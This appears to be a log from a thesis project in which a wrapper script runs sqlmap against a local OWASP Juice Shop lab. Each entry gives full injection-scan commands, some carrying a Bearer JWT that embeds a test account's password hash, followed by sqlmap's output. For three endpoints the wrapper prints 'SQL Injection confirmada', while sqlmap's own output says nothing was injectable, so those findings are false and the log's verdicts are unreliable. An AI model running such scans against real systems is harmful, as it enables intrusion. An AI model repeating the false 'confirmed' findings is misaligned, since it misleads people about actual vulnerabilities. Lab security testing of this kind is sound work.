+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Users/999999" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [?] Resultado inconclusivo para api_users_get_large_id
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[)]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  ["]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:42 /2026-06-01/
+  
+  [00:20:42] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:42] [INFO] loading tamper module 'space2comment'
+  [00:20:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:42] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:42] [INFO] flushing session file
+  [00:20:42] [INFO] testing connection to the target URL
+  [00:20:42] [CRITICAL] page not found (404)
+  it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
+  [00:20:42] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 1 times
+  
+  [*] ending @ 00:20:42 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[9/41] Testando: api_users_create
+  Método:    POST
+  Path:      /api/Users
+  Descrição: Criar novo usuário
+  Auth:      Não
+  Body:      {"email": "sqlmap_test@test.com", "password": "TestPass123!", "passwordRepeat": "TestPass123!", "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"}, "securityAnswer": "test"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Users" --method=POST --data='{"email": "sqlmap_test@test.com", "password": "TestPass123!", "passwordRepeat": "TestPass123!", "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"}, "securityAnswer": "test"}' --headers="Content-Type: application/json"
+
+  [?] Resultado inconclusivo para api_users_create
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:43 /2026-06-01/
+  
+  [00:20:43] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:43] [INFO] loading tamper module 'space2comment'
+  [00:20:43] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:43] [INFO] testing connection to the target URL
+  [00:20:43] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:20:43] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:43] [INFO] testing if the target URL content is stable
+  [00:20:44] [INFO] target URL content is stable
+  [00:20:44] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:20:44] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:20:44 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[10/41] Testando: api_products_list
+  Método:    GET
+  Path:      /api/Products
+  Descrição: Listar todos os produtos
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Products" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_products_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:44 /2026-06-01/
+  
+  [00:20:44] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:44] [INFO] loading tamper module 'space2comment'
+  [00:20:44] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:44] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:44] [INFO] flushing session file
+  [00:20:44] [INFO] testing connection to the target URL
+  [00:20:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:45] [INFO] testing if the target URL content is stable
+  [00:20:45] [INFO] target URL content is stable
+  [00:20:45] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:20:45] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:20:45] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:20:45] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:20:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:45] [WARNING] reflective value(s) found and filtering out
+  [00:20:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:20:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:20:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:20:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:20:46] [INFO] testing 'Generic inline queries'
+  [00:20:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:20:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:20:46] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:20:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:20:46] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:20:46] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:20:46] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:20:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:20:46] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:20:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:20:46] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:20:46 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[11/41] Testando: api_products_get_by_id
+  Método:    GET
+  Path:      /api/Products/1
+  Descrição: Obter produto por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Products/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_products_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:47 /2026-06-01/
+  
+  [00:20:47] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:47] [INFO] loading tamper module 'space2comment'
+  [00:20:47] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:47] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:47] [INFO] flushing session file
+  [00:20:47] [INFO] testing connection to the target URL
+  [00:20:47] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:47] [INFO] testing if the target URL content is stable
+  [00:20:48] [INFO] target URL content is stable
+  [00:20:48] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:20:48] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:20:48] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:20:48] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:20:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:20:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:20:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:20:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:20:48] [INFO] testing 'Generic inline queries'
+  [00:20:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:20:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:20:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:20:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:20:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:20:49] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:20:49] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:20:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:20:49] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:20:49] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:20:49] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 73 times
+  
+  [*] ending @ 00:20:49 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[12/41] Testando: api_products_get_large_id
+  Método:    GET
+  Path:      /api/Products/999999
+  Descrição: Obter produto com ID grande (teste path param)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Products/999999" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [?] Resultado inconclusivo para api_products_get_large_id
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:49 /2026-06-01/
+  
+  [00:20:50] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:50] [INFO] loading tamper module 'space2comment'
+  [00:20:50] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.92 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:50] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:50] [INFO] flushing session file
+  [00:20:50] [INFO] testing connection to the target URL
+  [00:20:50] [CRITICAL] page not found (404)
+  it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
+  [00:20:50] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 1 times
+  
+  [*] ending @ 00:20:50 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[13/41] Testando: rest_search
+  Método:    GET
+  Path:      /rest/products/search
+  Descrição: Buscar produtos (query param q)
+  Auth:      Sim (Bearer JWT)
+  Params:    q=apple
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/products/search?q=apple" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em rest_search
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  ["]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:50 /2026-06-01/
+  
+  [00:20:50] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:50] [INFO] loading tamper module 'space2comment'
+  [00:20:50] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:51] [INFO] testing connection to the target URL
+  [00:20:51] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:51] [INFO] testing if the target URL content is stable
+  [00:20:51] [INFO] target URL content is stable
+  [00:20:51] [INFO] testing if GET parameter 'q' is dynamic
+  [00:20:51] [INFO] GET parameter 'q' appears to be dynamic
+  [00:20:51] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+  [00:20:51] [INFO] testing for SQL injection on GET parameter 'q'
+  [00:20:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:20:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:20:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:20:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:20:52] [INFO] testing 'Generic inline queries'
+  [00:20:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:20:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:20:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:20:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:20:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:20:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:20:52] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:20:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:20:52] [WARNING] GET parameter 'q' does not seem to be injectable
+  [00:20:52] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:20:52] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 34 times
+  
+  [*] ending @ 00:20:52 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[14/41] Testando: rest_search_empty
+  Método:    GET
+  Path:      /rest/products/search
+  Descrição: Buscar produtos (query vazia - teste injeção)
+  Auth:      Sim (Bearer JWT)
+  Params:    q=
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/products/search?q=" --headers="Authorization: Bearer 